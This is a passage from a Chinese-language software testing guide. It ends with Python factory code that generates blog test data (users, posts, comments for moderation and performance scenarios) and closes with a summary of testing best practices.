        # 活跃用户创建更多内容
        posts = []
        for user in active_users:
            user_posts = PostFactory.create_batch_dict(
                random.randint(5, 10),
                author_id=user['id'],
                status='published'
            )
            posts.extend(user_posts)
        
        # 普通用户创建少量内容
        for user in regular_users:
            if random.random() < 0.6:  # 60%的用户有文章
                user_posts = PostFactory.create_batch_dict(
                    random.randint(1, 3),
                    author_id=user['id']
                )
                posts.extend(user_posts)
        
        return {
            'users': all_users,
            'posts': posts,
            'active_users': active_users,
            'regular_users': regular_users
        }
    
    def _create_content_moderation_scenario(self) -> Dict[str, Any]:
        """创建内容审核场景"""
        users = UserFactory.create_batch_dict(10)
        
        # 创建不同状态的文章
        published_posts = PostFactory.create_batch_dict(
            15,
            status='published',
            author_id=factory.LazyFunction(lambda: random.choice(users)['id'])
        )
        
        draft_posts = PostFactory.create_batch_dict(
            8,
            status='draft',
            author_id=factory.LazyFunction(lambda: random.choice(users)['id'])
        )
        
        archived_posts = PostFactory.create_batch_dict(
            5,
            status='archived',
            author_id=factory.LazyFunction(lambda: random.choice(users)['id'])
        )
        
        # 创建待审核的评论
        pending_comments = CommentFactory.create_batch_dict(
            10,
            is_approved=False,
            post_id=factory.LazyFunction(lambda: random.choice(published_posts)['id']),
            author_id=factory.LazyFunction(lambda: random.choice(users)['id'])
        )
        
        approved_comments = CommentFactory.create_batch_dict(
            25,
            is_approved=True,
            post_id=factory.LazyFunction(lambda: random.choice(published_posts)['id']),
            author_id=factory.LazyFunction(lambda: random.choice(users)['id'])
        )
        
        return {
            'users': users,
            'published_posts': published_posts,
            'draft_posts': draft_posts,
            'archived_posts': archived_posts,
            'pending_comments': pending_comments,
            'approved_comments': approved_comments
        }
    
    def _create_performance_test_scenario(self) -> Dict[str, Any]:
        """创建性能测试场景"""
        # 创建大量数据用于性能测试
        users = UserFactory.create_batch_dict(1000)
        posts = PostFactory.create_batch_dict(5000)
        comments = CommentFactory.create_batch_dict(15000)
        
        return {
            'users': users,
            'posts': posts,
            'comments': comments
        }
    
    def cleanup_test_data(self):
        """清理测试数据"""
        self.created_data = {
            'users': [],
            'posts': [],
            'comments': []
        }
    
    def export_test_data(self, filename: str):
        """导出测试数据到文件"""
        import json
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.created_data, f, indent=2, default=str, ensure_ascii=False)
    
    def import_test_data(self, filename: str):
        """从文件导入测试数据"""
        import json
        
        with open(filename, 'r', encoding='utf-8') as f:
            self.created_data = json.load(f)

# 使用示例
def test_data_example():
    # 创建测试数据管理器
    data_manager = TestDataManager()
    
    # 创建基础博客场景
    blog_data = data_manager.create_test_scenario('basic_blog')
    
    print(f"创建了 {len(blog_data['users'])} 个用户")
    print(f"创建了 {len(blog_data['posts'])} 篇文章")
    print(f"创建了 {len(blog_data['comments'])} 条评论")
    
    # 导出数据
    data_manager.export_test_data('test_data.json')
    
    # 清理数据
    data_manager.cleanup_test_data()

if __name__ == "__main__":
    test_data_example()
```

## 🏁 总结

本测试策略指南提供了全面的测试方法和最佳实践，包括：

### 核心测试原则
- 遵循测试金字塔结构
- 优先编写单元测试
- 合理使用集成测试和端到端测试
- 持续监控测试覆盖率和质量

### 测试类型覆盖
- **单元测试**: 测试独立的代码单元
- **集成测试**: 测试模块间的交互
- **API测试**: 验证接口功能和契约
- **性能测试**: 确保系统性能指标
- **安全测试**: 识别和防范安全漏洞
- **端到端测试**: 验证完整的用户流程

### 自动化和CI/CD
- 集成到持续集成流水线
- 自动生成测试报告
- 质量门禁控制
- 多环境测试支持

### 测试数据管理
- 使用工厂模式生成测试数据
- 创建可重用的测试场景
- 数据隔离和清理策略

通过遵循这些最佳实践，可以构建一个健壮、可维护的测试体系，确保代码质量和系统稳定性。